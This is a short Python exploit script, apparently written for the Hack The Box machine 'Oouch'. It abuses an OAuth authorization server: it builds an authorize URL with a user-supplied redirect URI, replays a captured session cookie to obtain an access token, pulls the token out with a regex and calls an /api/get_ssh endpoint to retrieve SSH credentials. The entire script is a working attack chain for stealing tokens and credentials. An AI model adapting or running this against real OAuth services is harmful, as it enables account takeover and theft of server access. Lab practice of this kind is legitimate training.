import requests
import re


a1= input("enter client id: ") 
a2= input("enter uri: ") 
a3= input("enter client secret: ") 
print ("-----------------------------------------------------------------------------------------------------------")
url = f"http://authorization.oouch.htb:8000/oauth/authorize/?client_id={a1}&redirect_uri=http://{a2}&grant_type=authorization_code&client_secret={a3}"
print ("-----------------------------------------------------------------------------------------------------------")

print (url)
xxx = input("->")

var1 = a1
var2 = a3
var3 = input("cookie: ")
Agent = "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
ocp = {"grant_type":"client_credentials","client_id":f"{var1}", "client_secret":f"{var2}"}
cookies = {"sessionid": f"{var3}"}


r = requests.post('http://authorization.oouch.htb:8000/oauth/token/', cookies=cookies,data=ocp)

print (r.content)
a=r.text
s = re.findall("[A-z0-9]{30}",a)

print ("-----------------------------------------------------------------------------------------------------------")
print(s[0])
print ("-----------------------------------------------------------------------------------------------------------")
tokx = s[0]


hox = f"http://authorization.oouch.htb:8000/api/get_ssh?access_token={tokx}"
r2 = requests.get(hox, cookies=cookies,data=ocp)
print (r2.content)
